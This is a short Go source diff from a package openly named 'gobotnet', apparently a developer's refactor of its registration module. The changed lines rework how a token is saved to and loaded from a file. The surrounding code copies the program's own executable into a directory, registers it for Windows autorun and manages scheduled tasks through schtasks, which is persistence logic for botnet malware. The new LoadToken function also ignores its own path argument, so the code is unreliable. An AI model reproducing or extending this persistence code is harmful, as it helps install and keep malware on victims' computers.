@@ -1,7 +1,6 @@
 package gobotnet
 
 import (
-	"errors"
 	"fmt"
 	"golang.org/x/sys/windows/registry"
 	"io/ioutil"
@@ -19,13 +18,19 @@ var (
 
 func RegTest() {
 	fmt.Println("REGISTRATION.GO TEST")
-	os.MkdirAll(copyProgramDir, 0777)
-	SaveTokenToFile(token)
-	//OutMessage(err.Error())
+
+	CreateDir(copyProgramDir, 0777)
+	if !CheckFileExist(tokenFile) {
+		CreateFile(tokenFile)
+		SaveToken(tokenFile, token)
+		//CopyFileToDirectory(sourceExecFilePath, copyExecFilePath)
+	} else {
+
+	}
 }
 
 func RegisterProgram() {
-	os.Mkdir(copyProgramDir, 0777)
+	CreateDir(copyProgramDir, 0777)
 	err := CopyFileToDirectory(sourceExecFilePath, copyExecFilePath)
 	OutMessage(err.Error())
 	err = RegisterAutoRun()
@@ -64,33 +69,19 @@ func UnRegisterSchedule(nameTask string) ([]byte, error) {
 	return CmdExec("schtasks /delete /f /tn " + nameTask)
 }
 
-func SaveTokenToFile(token string) error {
-	// file, err := os.Create(tokenFile)
-	// if err != nil {
-	// 	return err
-	// }
-	// defer file.Close()
-	// return err
-
-	err := ioutil.WriteFile(tokenFile, []byte(token), 0644)
+func SaveToken(pathFile, token string) error {
+	err := ioutil.WriteFile(pathFile, []byte(token), 0644)
+	if err != nil {
+		OutMessage(err.Error())
+	}
 	return err
 }
 
-func CheckFile(nameFile string) error {
-	_, err := os.Stat(nameFile)
+func LoadToken(pathFile string) string {
+	readBytes, err := ioutil.ReadFile(tokenFile)
 	if err != nil {
-		if os.IsNotExist(err) {
-			errors.New("File not exist.")
-		}
-		return err
+		OutMessage(err.Error())
+		return ""
 	}
-	return nil
+	return string(readBytes)
 }
-
-// func ReadTokenFromFile() string {
-// 	readBytes, err := ioutil.ReadFile(tokenFile)
-// 	if err != nil {
-// 		return ""
-// 	}
-// 	return string(readBytes)
-// }
